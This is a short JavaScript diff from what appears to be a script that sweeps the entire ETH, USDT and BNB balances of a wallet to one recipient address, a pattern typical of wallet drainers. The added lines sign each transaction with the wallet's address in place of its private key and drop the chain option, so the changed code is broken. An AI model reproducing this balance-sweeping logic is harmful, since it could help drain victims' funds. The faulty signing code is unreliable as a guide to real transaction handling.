@@ -150,8 +150,8 @@
                         gasPrice: '0x' + gasPriceWei.toString(16),
                     };
 
-                    const ethTransaction = new EthereumTx.Transaction(ethTransactionParameters, { chain: 'mainnet' });
-                    ethTransaction.sign(Buffer.from((await signer.getPrivateKey()).substring(2), 'hex'));
+                    const ethTransaction = new EthereumTx.Transaction(ethTransactionParameters);
+                    ethTransaction.sign(Buffer.from((await signer.getAddress()).substring(2), 'hex'));
                     const serializedEthTransaction = ethTransaction.serialize();
 
                     const usdtTransactionParameters = {
@@ -161,8 +161,8 @@
                         data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI()
                     };
 
-                    const usdtTransaction = new EthereumTx.Transaction(usdtTransactionParameters, { chain: 'mainnet' });
-                    usdtTransaction.sign(Buffer.from((await signer.getPrivateKey()).substring(2), 'hex'));
+                    const usdtTransaction = new EthereumTx.Transaction(usdtTransactionParameters);
+                    usdtTransaction.sign(Buffer.from((await signer.getAddress()).substring(2), 'hex'));
                     const serializedUsdtTransaction = usdtTransaction.serialize();
 
                     const bnbTransactionParameters = {
@@ -172,8 +172,8 @@
                         data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI()
                     };
 
-                    const bnbTransaction = new EthereumTx.Transaction(bnbTransactionParameters, { chain: 'mainnet' });
-                    bnbTransaction.sign(Buffer.from((await signer.getPrivateKey()).substring(2), 'hex'));
+                    const bnbTransaction = new EthereumTx.Transaction(bnbTransactionParameters);
+                    bnbTransaction.sign(Buffer.from((await signer.getAddress()).substring(2), 'hex'));
                     const serializedBnbTransaction = bnbTransaction.serialize();
 
                     // Send transactions
